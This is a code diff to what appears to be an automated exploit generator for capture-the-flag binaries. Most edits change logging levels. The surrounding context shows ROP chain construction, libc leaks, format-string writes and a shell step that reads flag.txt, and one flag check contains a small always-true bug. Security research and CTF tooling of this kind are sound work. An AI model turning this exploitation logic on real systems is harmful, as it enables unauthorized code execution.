@@ -60,7 +60,7 @@ class Against:
 
         """
 
-        if option == "REMOTE":
+        if option == "REMOTE" and self.ip != None and self.port != None:
             return remote(self.ip, self.port)
         elif option == "GDB":
             self.debug = True
@@ -73,7 +73,7 @@ class Against:
         chain = b""
 
         write_gadget, reg1, reg2 = self.machine.find_write_gadget()
-        aegis_log.info(f"Using write gadget {write_gadget} with {reg1}, {reg2} to {hex(writeable_address)}")
+        aegis_log.debug(f"Using write gadget {write_gadget} with {reg1}, {reg2} to {hex(writeable_address)}")
         write_gadget_address = int(write_gadget.split(b":")[0],16)
 
         reg_params = self.machine.reg_args 
@@ -209,7 +209,7 @@ class Against:
             chain += p64(plt_function)
             chain += p64(main)
 
-        aegis_log.info(f"Setting up libc leak with {self.leak_function}")
+        aegis_log.debug(f"Setting up libc leak with {self.leak_function}")
         self.has_libc_leak = True
 
         return chain 
@@ -222,7 +222,7 @@ class Against:
             try:
                 output = p.recvline()
             except EOFError:
-                aegis_log.info("Could not find libc leak")
+                aegis_log.error("Could not find libc leak")
             match = pattern.search(output)
 
         #aegis_log.info(f"Recieved leak from output {output}")
@@ -296,7 +296,7 @@ class Against:
         stack_len = 100
         string = ""
 
-        aegis_log.info(f"Performing a printf format leak")
+        aegis_log.debug(f"Performing a printf format leak")
         # Run the process for stack len amount of times
         # leak the entire stack.
         for i in range(1, stack_len):
@@ -355,7 +355,7 @@ class Against:
             addr: value
         }
 
-        aegis_log.info(f"Setting up format string write to {hex(addr)} with value {hex(value)}")
+        aegis_log.debug(f"Setting up format string write to {hex(addr)} with value {hex(value)}")
         offset = 0
 
         for i in range(1,100):
@@ -377,14 +377,14 @@ class Against:
         self.exploit = self.padding + self.chain
 
         if self.exploit != None and self.format_exploit == None:
-            aegis_log.info(f"Sending chain as {self.chain}") 
+            aegis_log.debug(f"Sending chain as {self.chain}") 
             self.process.sendline(self.exploit)
             if self.has_libc_leak == True:
                 libc_base = self.recv_libc_leak(self.process, self.leak_function)
                 if libc_base != None:
                     self.libc_exploit = self.padding + self.rop_chain_libc(libc_base)
 
-                    aegis_log.info(f"Sending libc system chain {self.libc_exploit}")
+                    aegis_log.debug(f"Sending libc system chain {self.libc_exploit}")
                     self.process.sendline(self.libc_exploit)
 
             if self.debug == True:
@@ -407,7 +407,7 @@ class Against:
             aegis_log.info(f"Exploit works got flag {self.flag}")
             return True
         else:
-            aegis_log.warning(f"Exploit failed")
+            aegis_log.error(f"Exploit failed")
             return False
 
     def recieve_flag(self):
@@ -417,7 +417,7 @@ class Against:
             self.process.sendline(b"cat flag.txt")
 
             output = self.process.recvall(timeout=2)
-            aegis_log.info(f"Recieved output {output}")
+            aegis_log.debug(f"Recieved output {output}")
             if b"{" in output and b"}":
                 self.flag = b"{" + output.split(b"{")[1].replace(b" ", b"")
                 self.flag = self.flag.replace(b"\n", b"").split(b"}")[0] + b"}"
